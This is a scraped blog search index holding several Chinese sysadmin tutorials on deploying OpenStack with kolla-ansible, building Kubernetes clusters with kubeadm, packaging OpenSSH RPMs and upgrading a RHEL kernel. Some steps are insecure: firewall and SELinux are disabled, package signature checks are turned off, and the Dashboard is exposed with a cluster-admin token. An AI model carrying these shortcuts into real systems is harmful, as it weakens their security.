--key-name mykey \\ --network demo-net \\ demo-centos 创建完成后为实例绑定浮动IP。\n如果实例创建失败可以查看相关组件报错日志\n[root@kolla ~]# tail -100f /var/log/kolla/nova/nova-compute.log 如果没有提前定制镜像修改root密码，只能使用centos用户及sshkey登录，由于是在容器中运行的demo示例，ssh私钥也保存在容器的默认目录下，在容器中连接实例浮动IP测试\n[root@kolla ~]# docker exec -it client bash ()[root@b86f87f7f101 ~]# ssh -i /root/.ssh/id_rsa centos@192.168.35.186 Last login: Fri Oct 29 08:10:42 2021 from 192.168.35.188 [centos@demo-centos ~]$ sudo -i [root@demo-centos ~]# 运行Ubuntu实例 下载镜像\nwget https://cloud-images.ubuntu.com/bionic/current/bionic-server-cloudimg-amd64.img docker cp bionic-server-cloudimg-amd64.img client:/ 上传镜像\nopenstack image create \u0026#34;Ubuntu1804\u0026#34; \\ --file bionic-server-cloudimg-amd64.img \\ --disk-format qcow2 --container-format bare \\ --public 创建实例\nopenstack server create \\ --image Ubuntu1804 \\ --flavor m1.small \\ --key-name mykey \\ --network demo-net \\ demo-ubuntu 绑定浮动ip\nubuntu镜像默认用户为ubuntu，首次登陆使用sshkey方式\n调整集群配置 集群部署完成后需要开启新的组件或者扩容，可以修改/etc/kolla/global.yml调整参数。 或者在/etc/kolla/config目录下创建自定义配置文件，例如\n# mkdir -p /etc/kolla/config/nova # vim /etc/kolla/config/nova/nova.conf [DEFAULT] block_device_allocate_retries = 300 block_device_allocate_retries_interval = 3 重新配置openstack，kolla会自动重建配置变动的容器组件。\nkolla-ansible -i all-in-one reconfigure -t nova kolla配置和日志文件 各个组件配置文件目录： /etc/kolla/ 各个组件日志文件目录：/var/log/kolla/ 清理kolla ansilbe集群 kolla-ansible destroy --include-images --yes-i-really-really-mean-it #或者 [root@kolla ~]# cd /usr/share/kolla-ansible/tools/ [root@all tools]# ./cleanup-containers [root@all tools]# ./cleanup-host #重置cinder卷，谨慎操作 vgremove cinder-volumes 重新部署 Kolla ansible 集群 ## 清除操作 先关闭所有运行的实例，再进行下面操作 [root@kolla ~]# cd /usr/share/kolla-ansible/tools/ [root@all tools]# ./cleanup-containers vgremove cinder-volumes ## 重建操作 pvcreate /dev/sdb vgcreate cinder-volumes /dev/sdb kolla-ansible -i ./all-in-one deploy kolla-ansible post-deploy 可能遇到的问题 虚拟ip分配失败 这种情况多半是由于虚拟ip没有分配到，并不是端口问题\n解决方法1 在全局的配置中添加/修改这个id值，必须是0-255之间的数字，并且确保在整个二层网络中是唯一的\nvim /etc/kolla/globals.yml keepalived_virtual_router_id: \u0026#34;199\u0026#34; https://www.bianchengquan.com/article/506138.html\n解决方法2 https://www.nuomiphp.com/serverfault/en/5fff3e4524544316281a16b0.html\n参考 https://blog.csdn.net/networken/article/details/106728002\n","permalink":"https://lvbibir.github.io/posts/tech/kolla-ansible_deploy_allinone_train/","summary":"kolla ansible简介 kolla 的使命是为 openstack 云平台提供生产级别的、开箱即用的交付能力。kolla 的基本思想是一切皆容器，将所有服务基于 Docker 运行，并且保证","title":"kolla-ansible部署Train版openstack（all-in-one）"},{"content":"kubeadm 搭建 k8s 集群 [离线版] v1.18.6 参考：https://www.cnblogs.com/hukey/p/13773927.html\nKubernetes 概述 kubernetes 是什么 kubernetes 是 Google 在 2014年开源的一个容器集群管理平台，kubernetes简称 k8s k8s用于容器化应用程序的部署，扩展和管理。 k8s提供了容器的编排，资源调度，弹性伸缩，部署管理，服务发现等一系列功能 kubernetes目标是让部署容器化应用简单高效 Kubernetes 特性 自我修复 在节点故障时重新启动失败的容器，替换和重新部署，保证预期的副本数量；杀死健康检查失败的容器，并且在未准备好之前不会处理客户端请求，确保线上服务不中断。 伸缩性 使用命令、UI或者基于CPU使用情况自动快速扩容和缩容应用程序实例，保证应用业务高峰并发时的高可用性；业务低峰时回收资源，以最小成本运行服务。 自动部署和回滚 K8S采用滚动更新策略更新应用，一次更新一个Pod，而不是同时删除所有Pod，如果更新过程中出现问题，将回滚更改，确保升级不受影响业务。 服务发现和负载均衡 K8S为多个容器提供一个统一访问入口（内部IP地址和一个DNS名称），并且负载均衡关联的所有容器，使得用户无需考虑容器IP问题。 机密和配置管理 管理机密数据和应用程序配置，而不需要把敏感数据暴露在镜像里，提高敏感数据安全性。并可以将一些常用的配置存储在K8S中，方便应用程序使用。 存储编排 挂载外部存储系统，无论是来自本地存储，公有云（如AWS），还是网络存储（如NFS、GlusterFS、Ceph）都作为集群资源的一部分使用，极大提高存储使用灵活性。 批处理 提供一次性任务，定时任务；满足批量数据处理和分析的场景。 Kubeadm 概述 kubeadm是Kubernetes项目自带的及集群构建工具，负责执行构建一个最小化的可用集群以及将其启动等的必要基本步骤，kubeadm是Kubernetes集群全生命周期的管理工具，可用于实现集群的部署、升级、降级及拆除。kubeadm部署Kubernetes集群是将大部分资源以pod的方式运行，例如（kube-proxy、kube-controller-manager、kube-scheduler、kube-apiserver、flannel)都是以pod方式运行。\nKubeadm仅关心如何初始化并启动集群，余下的其他操作，例如安装Kubernetes Dashboard、监控系统、日志系统等必要的附加组件则不在其考虑范围之内，需要管理员自行部署。\nKubeadm集成了Kubeadm init和kubeadm join等工具程序，其中kubeadm init用于集群的快速初始化，其核心功能是部署Master节点的各个组件，而kubeadm join则用于将节点快速加入到指定集群中，它们是创建Kubernetes集群最佳实践的“快速路径”。另外，kubeadm token可于集群构建后管理用于加入集群时使用的认证令牌（token)，而kubeadm reset命令的功能则是删除集群构建过程中生成的文件以重置回初始状态。\nKuberadm 离线部署 k8s 集群 架构图 环境规划 操作系统 IP CPU/MEM 主机名 角色 CentOS 7.7-x86_64 192.168.1.14 2/4G k8s-master Master CentOS 7.7-x86_64 192.168.1.15 2/4G k8s-node1 Work node CentOS 7.7-x86_64 192.168.1.16 2/4G k8s-node2 Work node 【软件包版本号】\nname version Docker 3:19.03.13 kubeadm v1.18.6 kubernetes v1.18.6 安装前提条件 Centos 7.x 最小化安装 时钟同步 下载离线程序包 更新修复，请下载 k8s-kubeadmin.zip 压缩包！！！\n链接：https://pan.baidu.com/s/1Q3jbJcgq0rH8jK-LTpa6Vg 提取码：hhhh\n部署Master节点 执行自动安装脚本 将下载到的程序包拷贝到 k8s-master 节点解压，我这里的master节点是 192.168.1.14\n[root@localhost ~]# ip a | egrep global inet 192.168.1.14/24 brd 192.168.1.255 scope global noprefixroute eth0 [root@localhost ~]# ls anaconda-ks.cfg k8s-kubeadm.tar.gz [root@localhost ~]# tar xf k8s-kubeadm.tar.gz [root@localhost ~]# cd k8s-kubeadm [root@localhost k8s-kubeadm]# ls docker-ce-19.03.12.tar.gz flannel-v0.12.0-linux-amd64.tar.gz install.sh k8s-imagesV1.18.6.tar.gz k8s-V1.18.6.tar.gz kube-flannel.yml packages.tar.gz # 执行脚本 ./install.sh [主机名] [root@localhost k8s-kubeadm]# ./install.sh k8s-master 等待脚本执行自动安装。。。\n执行完毕后，会出现以下提示：\n因为内核进行了升级，请重启服务器。\n重启以后，内核版本更新为 5.8.13\n使用 kubeadm 初始化集群 kubeadm init --kubernetes-version=v1.18.6 --apiserver-advertise-address=192.168.1.14 --pod-network-cidr=10.244.0.0/16 --service-cidr=10.96.0.0/12 等待集群初始化完成。。。\nkubeadm join 192.168.1.14:6443 --token utml0h.gj2nafii8xm1512e \\ --discovery-token-ca-cert-hash sha256:e91fb35667cf51c76b9afa288e4416a1314a1244158123ffbcee55b7ac4a70d4 上面命令记录下来，这是将 node 节点加入到 集群的执行操作命令。\n出现如上提示，集群初始化成功，执行提示命令：\n[root@k8s-master ~]# mkdir -p $HOME/.kube [root@k8s-master ~]# cp -i /etc/kubernetes/admin.conf $HOME/.kube/config [root@k8s-master ~]# chown $(id -u):$(id -g) $HOME/.kube/config 使用 kubectl 查看 nodes\n[root@k8s-master ~]# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-master NotReady master 74s v1.18.6 初始化网络插件 flannel # 进入压缩后的目录里 [root@k8s-master ~]# cd k8s-kubeadm/ # 开始进行 flannel 初始化安装 [root@k8s-master k8s-kubeadm]# kubectl apply -f kube-flannel.yml podsecuritypolicy.policy/psp.flannel.unprivileged created clusterrole.rbac.authorization.k8s.io/flannel created clusterrolebinding.rbac.authorization.k8s.io/flannel created serviceaccount/flannel created configmap/kube-flannel-cfg created daemonset.apps/kube-flannel-ds created flannel 初始化完成后，查看 nodes 状态：\n[root@k8s-master k8s-kubeadm]# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-master Ready master 3m58s v1.18.6 到此，通过 kubeadm 初始化安装 master 节点完毕。接下来是 node 节点就很简单。\n部署node节点 将下载的压缩包拷贝到 node 节点执行 [root@k8s-master ~]# scp k8s-kubeadm.tar.gz 192.168.1.15:/root/ ------以下node节点执行------ [root@localhost ~]# ls anaconda-ks.cfg k8s-kubeadm.tar.gz [root@localhost ~]# tar xf k8s-kubeadm.tar.gz [root@localhost ~]# cd k8s-kubeadm/ # ./install.sh 主机名 [root@localhost k8s-kubeadm]# ./install.sh k8s-node1 这里和上面 master 初始化一样，完成后重启主机。\n重启完成后，执行 join 命令加入集群 # 就是上面记录的命令 kubeadm join 192.168.1.14:6443 --token utml0h.gj2nafii8xm1512e \\ --discovery-token-ca-cert-hash sha256:e91fb35667cf51c76b9afa288e4416a1314a1244158123ffbcee55b7ac4a70d4 切换到 k8s-master 查看 k8s-node1 是否加入集群 k8s-node1 成功加入集群，剩下的 node 节点都是一样的操作。\n到此，通过 kubeadm 搭建 k8s 环境已经完成。\nk8s 集群简单测试 注意：本节测试需要网络拉取镜像，可以通过网络将 镜像拷贝到主机里 所需镜像： nginx:alpine / busybox\n这里做一个简单的小测试来证明集群是健康正常运行的。\n创建一个 nginx pod [root@k8s-master ~]# kubectl run nginx-deploy --image=nginx:alpine pod/nginx-deploy created [root@k8s-master ~]# kubectl get pods NAME READY STATUS RESTARTS AGE nginx-deploy 1/1 Running 0 11s [root@k8s-master ~]# kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx-deploy 1/1 Running 0 18s 10.244.1.2 k8s-node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 为 nginx pod 创建一个服务 [root@k8s-master ~]# kubectl expose pod nginx-deploy --name=nginx --port=80 --target-port=80 --protocol=TCP service/nginx exposed [root@k8s-master ~]# kubectl get service NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 21m nginx ClusterIP 10.106.14.253 \u0026lt;none\u0026gt; 80/TCP 9s [root@k8s-master ~]# curl 10.106.14.253 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 创建一个 busybox pod 来通过 nginx 服务名访问 [root@k8s-master ~]# kubectl run client --image=busybox -it If you don\u0026#39;t see a command prompt, try pressing enter. ------ 通过服务名来访问 nginx 服务 ------ / # wget -O - -q nginx \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; / # cat /etc/resolv.conf nameserver 10.96.0.10 search default.svc.cluster.local svc.cluster.local cluster.local options ndots:5 测试通过，网络及dns服务正常。集群处于正常健康状态。\n","permalink":"https://lvbibir.github.io/posts/tech/kubeadm_deploy_k8s_v1.18.6_offline/","summary":"kubeadm 搭建 k8s 集群 [离线版] v1.18.6 参考：https://www.cnblogs.com/hukey/p/13773927.html Kubernetes 概述 kubernetes 是什么 kubernetes 是 Google","title":"kubeadm 搭建 k8s 集群 [离线版] v1.18.6"},{"content":"kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具。\n这个工具能通过两条指令完成一个kubernetes集群的部署：\n# 创建一个 Master 节点 $ kubeadm init # 将一个 Node 节点加入到当前集群中 $ kubeadm join \u0026lt;Master节点的IP和端口 \u0026gt; 1. 安装要求 在开始之前，部署Kubernetes集群机器需要满足以下几个条件：\n一台或多台机器，操作系统 CentOS7.x-86_x64 硬件配置：2GB或更多RAM，2个CPU或更多CPU，硬盘30GB或更多 集群中所有机器之间网络互通 可以访问外网，需要拉取镜像 禁用swap分区 2. 准备环境 角色 IP k8s-master 192.168.150.101 k8s-node1 192.168.150.102 k8s-node2 192.168.150.103 关闭防火墙： $ systemctl stop firewalld $ systemctl disable firewalld 关闭selinux： $ sed -i \u0026#39;s/enforcing/disabled/\u0026#39; /etc/selinux/config # 永久 $ setenforce 0 # 临时 关闭swap： $ swapoff -a # 临时 $ vim /etc/fstab # 永久 注释掉swap分区相关行 设置主机名： $ hostnamectl set-hostname \u0026lt;hostname\u0026gt; 在master添加hosts： $ cat \u0026gt;\u0026gt; /etc/hosts \u0026lt;\u0026lt; EOF 192.168.150.101 k8s-master 192.168.150.102 k8s-node1 192.168.150.103 k8s-node2 EOF 将桥接的IPv4流量传递到iptables的链： $ cat \u0026gt; /etc/sysctl.d/k8s.conf \u0026lt;\u0026lt; EOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOF $ sysctl --system # 生效 时间同步： $ yum install ntpdate -y $ ntpdate time.windows.com 3. 安装 Docker/kubeadm/kubelet/kubectl (所有节点) Kubernetes默认CRI（容器运行时）为Docker，因此先安装Docker。\n3.1 安装Docker $ wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo $ yum -y install docker-ce $ systemctl enable docker \u0026amp;\u0026amp; systemctl start docker 3.2 配置镜像下载加速器，同时修改docker的cgroupdriver为systemd $ cat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt; EOF { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://jc0srqak.mirror.aliyuncs.com\u0026#34;], \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;] } EOF $ systemctl restart docker $ docker info 3.3 添加阿里云YUM软件源 $ cat \u0026gt; /etc/yum.repos.d/kubernetes.repo \u0026lt;\u0026lt; EOF [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF 3.4 安装kubeadm，kubelet和kubectl 由于版本更新频繁，这里指定版本号部署：\n$ yum install -y kubelet-1.22.3 kubeadm-1.22.3 kubectl-1.22.3 $ systemctl enable kubelet $ systemctl start kubelet 4. 部署Kubernetes Master https://kubernetes.io/zh/docs/reference/setup-tools/kubeadm/kubeadm-init/#config-file\nhttps://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/#initializing-your-control-plane-node\n在192.168.150.101（Master）执行。\n$ kubeadm init \\ --apiserver-advertise-address=192.168.150.101 \\ --kubernetes-version v1.22.3 \\ --service-cidr=10.96.0.0/12 \\ --pod-network-cidr=10.244.0.0/16 \\ --ignore-preflight-errors=all \\ --image-repository registry.aliyuncs.com/google_containers \u0026ndash;apiserver-advertise-address 集群通告地址 \u0026ndash;kubernetes-version K8s版本，与上面安装的一致 \u0026ndash;service-cidr 集群内部虚拟网络，Pod统一访问入口 \u0026ndash;pod-network-cidr Pod网络，与下面部署的CNI网络组件yaml中保持一致 \u0026ndash;ignore-preflight-errors=all，跳过一些错误 \u0026ndash;image-repository 由于默认拉取镜像地址k8s.gcr.io国内无法访问，这里指定阿里云镜像仓库地址 或者使用配置文件引导：\n$ vi kubeadm.conf apiVersion: kubeadm.k8s.io/v1beta2 kind: ClusterConfiguration kubernetesVersion: v1.22.3 imageRepository: registry.aliyuncs.com/google_containers networking: podSubnet: 10.244.0.0/16 serviceSubnet: 10.96.0.0/12 $ kubeadm init --config kubeadm.conf --ignore-preflight-errors=all 拷贝kubectl使用的连接k8s认证文件到默认路径：\nmkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config $ kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-master Ready master 2m v1.18.0 5. 加入Kubernetes Node 在192.168.150.102/103（Node）执行。\n向集群添加新节点，执行在kubeadm init输出的kubeadm join命令：\n$ kubeadm join 192.168.150.101:6443 --token esce21.q6hetwm8si29qxwn \\ --discovery-token-ca-cert-hash sha256:00603a05805807501d7181c3d60b478788408cfe6cedefedb1f97569708be9c5 默认token有效期为24小时，当过期之后，该token就不可用了。这时就需要重新创建token，操作如下：\n$ kubeadm token create $ kubeadm token list $ openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2\u0026gt;/dev/null | openssl dgst -sha256 -hex | sed \u0026#39;s/^.* //\u0026#39; 63bca849e0e01691ae14eab449570284f0c3ddeea590f8da988c07fe2729e924 $ kubeadm join 192.168.150.101:6443 --token nuja6n.o3jrhsffiqs9swnu --discovery-token-ca-cert-hash sha256:63bca849e0e01691ae14eab449570284f0c3ddeea590f8da988c07fe2729e924 或者直接命令快捷生成：kubeadm token create \u0026ndash;print-join-command\nhttps://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm-join/\n6. 部署容器网络（CNI） https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/#pod-network\n注意：只需要部署下面其中一个，推荐Calico。\nCalico是一个纯三层的数据中心网络方案，Calico支持广泛的平台，包括Kubernetes、OpenStack等。\nCalico 在每一个计算节点利用 Linux Kernel 实现了一个高效的虚拟路由器（ vRouter） 来负责数据转发，而每个 vRouter 通过 BGP 协议负责把自己上运行的 workload 的路由信息向整个 Calico 网络内传播。\n此外，Calico 项目还实现了 Kubernetes 网络策略，提供ACL功能。\nhttps://docs.projectcalico.org/getting-started/kubernetes/quickstart\n$ wget https://docs.projectcalico.org/manifests/calico.yaml 下载完后还需要修改里面定义Pod网络（CALICO_IPV4POOL_CIDR），与前面kubeadm init指定的一样\n修改完后应用清单：\n$ kubectl apply -f calico.yaml $ kubectl get pods -n kube-system 7. 测试kubernetes集群 验证Pod工作 验证Pod网络通信 验证DNS解析 在Kubernetes集群中创建一个pod，验证是否正常运行：\n$ kubectl create deployment nginx --image=nginx $ kubectl expose deployment nginx --port=80 --type=NodePort $ kubectl get pod,svc 访问地址：http://NodeIP:Port\n8. 部署 Dashboard $ wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml 默认Dashboard只能集群内部访问，修改Service为NodePort类型，暴露到外部：\n$ vi recommended.yaml ... kind: Service apiVersion: v1 metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboard spec: ports: - port: 443 targetPort: 8443 nodePort: 30001 selector: k8s-app: kubernetes-dashboard type: NodePort ... $ kubectl apply -f recommended.yaml $ kubectl get pods -n kubernetes-dashboard NAME READY STATUS RESTARTS AGE dashboard-metrics-scraper-6b4884c9d5-gl8nr 1/1 Running 0 13m kubernetes-dashboard-7f99b75bf4-89cds 1/1 Running 0 13m 访问地址：https://NodeIP:30001\n创建service account并绑定默认cluster-admin管理员集群角色：\n# 创建用户 $ kubectl create serviceaccount dashboard-admin -n kube-system # 用户授权 $ kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin --serviceaccount=kube-system:dashboard-admin # 获取用户Token $ kubectl describe secrets -n kube-system $(kubectl -n kube-system get secret | awk \u0026#39;/dashboard-admin/{print $1}\u0026#39;) 使用输出的token登录Dashboard。\n","permalink":"https://lvbibir.github.io/posts/tech/kubeadm_deploy_k8s_v1.22.3/","summary":"kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具。 这个工具能通过两条指令完成一个kubernetes集群的部署：","title":"kubeadm快速搭建K8s集群v1.22.3"},{"content":"编译环境 编译平台：\tvmware workstation 系统版本：\t普华服务器操作系统v4.0 系统内核：\t3.10.0-327.el7.isoft.x86_64 软件版本：\topenssh-8.7p1.tar.gz x11-ssh-askpass-1.2.4.1.tar.gz\n编译步骤 yum安装依赖工具\nyum install gdb imake libXt-devel gtk2-devel rpm-build zlib-devel openssl-devel gcc perl-devel pam-devel unzip krb5-devel libX11-devel initscripts -y 创建编译目录\nmkdir -p /root/rpmbuild/{SOURCES,SPECS} 下载openssh编译包和x11-ssh-askpass依赖包并解压修改配置\ncd /root/rpmbuild/SOURCES wget https://openbsd.hk/pub/OpenBSD/OpenSSH/portable/openssh-8.7p1.tar.gz wget https://src.fedoraproject.org/repo/pkgs/openssh/x11-ssh-askpass-1.2.4.1.tar.gz/8f2e41f3f7eaa8543a2440454637f3c3/x11-ssh-askpass-1.2.4.1.tar.gz tar -zxvf openssh-8.7p1.tar.gz cp openssh-8.7p1/contrib/redhat/openssh.spec /root/rpmbuild/SPECS/ sed -i -e \u0026#34;s/%define no_x11_askpass 0/%define no_x11_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec sed -i -e \u0026#34;s/%define no_gnome_askpass 0/%define no_gnome_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec 准备编译\nvim /root/rpmbuild/SPECS/openssh.spec 注释掉 BuildRequires: openssl-devel \u0026lt; 1.1 这一行 开始编译\nrpmbuild -ba /root/rpmbuild/SPECS/openssh.spec 操作验证\ncd /root/rpmbuild/RPMS/x86_64/ vim run.sh #!/bin/bash cp /etc/pam.d/sshd /etc/pam.d/sshd_bak cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak rpm -Uvh ./*.rpm cp -r /etc/pam.d/sshd_bak /etc/pam.d/ cp /etc/ssh/sshd_config_bak /etc/ssh/sshd_config rm -rf /etc/ssh/ssh*key systemctl daemon-reload systemctl restart sshd chmod 755 run.sh ./run.sh ssh -V 打包归档\n[root@localhost ~]# cd /root/rpmbuild/RPMS/x86_64/ [root@localhost x86_64]# ls openssh-8.7p1-1.el7.isoft.x86_64.rpm openssh-askpass-8.7p1-1.el7.isoft.x86_64.rpm openssh-askpass-gnome-8.7p1-1.el7.isoft.x86_64.rpm openssh-clients-8.7p1-1.el7.isoft.x86_64.rpm openssh-debuginfo-8.7p1-1.el7.isoft.x86_64.rpm openssh-server-8.7p1-1.el7.isoft.x86_64.rpm run.sh [root@localhost x86_64]# vim run.sh #!/bin/bash cp /etc/pam.d/sshd /etc/pam.d/sshd_bak cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak rpm -Uvh ./*.rpm cp -r /etc/pam.d/sshd_bak /etc/pam.d/ cp /etc/ssh/sshd_config_bak /etc/ssh/sshd_config rm -rf /etc/ssh/ssh*key systemctl daemon-reload systemctl restart sshd [root@localhost x86_64]# tar zcvf openssh-8.7p1.rpm.x86_64.tar.gz ./* [root@localhost x86_64]# mv openssh-8.7p1.rpm.x86_64.tar.gz /root 使用 tar zxf openssh-8.7p1.rpm.x86_64.tar.gz ./run.sh ","permalink":"https://lvbibir.github.io/posts/tech/openssh_src_build_rpm_8.7p1/","summary":"编译环境 编译平台： vmware workstation 系统版本： 普华服务器操作系统v4.0 系统内核： 3.10.0-327.el7.isoft.x86_64 软件版本： openssh-8.7p1.tar.gz x11-ssh-askpass-1.2.4.1.tar.gz 编译步骤 yum安装依赖工具 yum install gdb imake libXt-devel gtk2-devel rpm-build zlib-devel openssl-devel gcc perl-devel pam-devel unzip krb5-devel libX11-devel","title":"openssh源码打包编译成rpm包（8.7p1）"},{"content":"前言 按指定要求安装升级内核，保证grub2启动时为默认项目\n第一步 确认当前操作系统的内核版本\n[root@server0 ~]# uname -r 3.10.0-123.el7.x86_64\n第二步 下载准备升级的内核文件，比如说内核已存在于某个 Yum 仓库：http://content.example.com/rhel7.0/x86_64/errata\n此时只要添加这个 Yum 源就可以直接下载了。\n[root@server0 ~]# yum-config-manager \u0026ndash;add-repo=\u0026ldquo;http://content.example.com/rhel7.0/x86_64/errata\u0026quot;\n若是第一次配置，还需要导入红帽公钥\n[root@server0 ~]# rpm \u0026ndash;import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-*\n第三步 查找内核，并确认 Yum 仓库中的内核是否为需要升级的内核\n[root@server0 ~]# yum list kernel\n第四步 安装新的内核，若内核文件很大，那安装时间就相对漫长一些。\n[root@server0 ~]# yum -y install kernel\n第五步 检查新内核是否为默认启动内核（若是安装高版本号的内核，默认都会作为优先启动内核）\n[root@server0 ~]# grub2-editenv list saved_entry=Red Hat Enterprise Linux Server (3.10.0-123.1.2.el7.x86_64) 7.0 (Maipo)\n当前默认启动内核已经是刚才升级的内核！如果要手动调整内核启动顺序，需要再进行设置一番。\n第六步 确认当前操作系统有几个启动内核\n当前操作系统有三个内核，其中第一个内核版本为 3.10.0-123.1.2.el7.x86_64，也就是我们刚才升级的内核；第二个内核版本为 3.10.0-123.el7.x86_64，是最初查看的内核版本。\n现在设置第二个内核（3.10.0-123.el7.x86_64）为默认启动内核\n[root@server0 ~]# grub2-set-default \u0026ldquo;Red Hat Enterprise Linux Server, with Linux 3.10.0-123.el7.x86_64\u0026rdquo;\n然后确认一下是否设置成功\n[root@server0 ~]# grub2-editenv list\nsaved_entry=Red Hat Enterprise Linux Server, with Linux 3.10.0-123.el7.x86_64\n重启检查新内核\n[root@server0 ~]# uname -r\n","permalink":"https://lvbibir.github.io/posts/tech/redhat_update_kernel/","summary":"前言 按指定要求安装升级内核，保证grub2启动时为默认项目 第一步 确认当前操作系统的内核版本 [root@server0 ~]# uname -r 3.10.0-123.el7.x86_64 第二步 下载准备升级的内核文件，比如说内核","title":"redhat服务器升级内核"},{"content":"#!/bin/bash #参数定义 date=`date +\u0026#34;%Y-%m-%d-%H:%M:%S\u0026#34;` centosVersion=$(awk \u0026#39;{print $(NF-1)}\u0026#39; /etc/redhat-release) VERSION=`date +%F` #日志相关 LOGPATH=\u0026#34;/tmp/awr\u0026#34; [ -e $LOGPATH ] || mkdir -p $LOGPATH RESULTFILE=\u0026#34;$LOGPATH/HostCheck-`hostname`-`date +%Y%m%d`.txt\u0026#34; #调用函数库 [ -f /etc/init.d/functions ] \u0026amp;\u0026amp; source /etc/init.d/functions export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin source /etc/profile #root用户执行脚本 [ $(id -u) -gt 0 ] \u0026amp;\u0026amp; echo \u0026#34;请用root用户执行此脚本！\u0026#34; \u0026amp;\u0026amp; exit 1 function version(){ echo \u0026#34;\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[${date}] \u0026gt;\u0026gt;\u0026gt; `hostname -s` 主机巡检\u0026#34; } function getSystemStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m****************************************************系统检查****************************************************\\033[0m\u0026#34; if [ -e /etc/sysconfig/i18n ];then default_LANG=\u0026#34;$(grep \u0026#34;LANG=\u0026#34; /etc/sysconfig/i18n | grep -v \u0026#34;^#\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{print $2}\u0026#39;)\u0026#34; else default_LANG=$LANG fi export LANG=\u0026#34;en_US.UTF-8\u0026#34; Release=$(cat /etc/redhat-release 2\u0026gt;/dev/null) Kernel=$(uname -r) OS=$(uname -o) Hostname=$(uname -n) SELinux=$(/usr/sbin/sestatus | grep \u0026#34;SELinux status: \u0026#34; | awk \u0026#39;{print $3}\u0026#39;) LastReboot=$(who -b | awk \u0026#39;{print $3,$4}\u0026#39;) uptime=$(uptime | sed \u0026#39;s/.*up \\([^,]*\\), .*/\\1/\u0026#39;) echo \u0026#34; 系统：$OS\u0026#34; echo \u0026#34; 发行版本：$Release\u0026#34; echo \u0026#34; 